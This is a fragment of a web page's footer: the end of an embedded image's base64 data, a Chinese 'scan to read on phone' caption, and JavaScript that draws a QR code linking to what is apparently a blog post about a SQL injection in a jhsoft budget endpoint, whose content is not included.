Bq7TerKzdXs6cL+9vHh4r7lviE7qQnYP5HAYP5/cfdurazxbthc+8QrB1xOMK004sAaM4SvOayZeYepgv180R5je4D6JVzXJzbjSgvslV2vuG5JTuQi2F3Xw1OA8fuRngG3f1OcJSRwMLww3I/S+c+5MDK7XGjJwDB3P9IkGXJe4ovqvrGruG1JP4wJ+G8hqcnvcf9n3qif4qUou/cE8dEwumBphuDMofTXwGqva6JKD89rUHCG4H3D/+f1xsa92Q7Iv6NOC0Y/mDM5PVWLoPd/1SU3F1EDvA6MfTermWDy4ZpVTXpYcjNrwFcEaGHGlqZx8rRXbDESC237vBO6B/N7ZL1f+koHkukG/rlktuTkWD9YnF1ROllgIx1rpZwPXhAfH0P+XIegcoKVOW/oKTxc9Hg/g9RfhVc2XDGTV+OY+dwJfOhA9KTHYfwqy1WgTg2vAGP6zOPevfcBrRBME80CTJxdijsNXPNIc5b50IHVDt/+5E9gMJNNb4UeWSD3w+n0JW5z7pSY89Jo5t9KEC0KvB0IvEXjtM+sIl8InCdZCR+mrPWWf+t4M5FNd7qIvO4E2EOjThmN/b3XoddHUp0Z+eCFYL18GYyxuz9RrNjiur/r0BdckF74iWBMu2orJBcE1VRM/miBYC9x/Onlc7KvdkIvt66/dzv8AAAD//5SZO0oAAAAGSURBVAMA5Z6Nm0m+41QAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-AjaxForBudgetDecompose-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 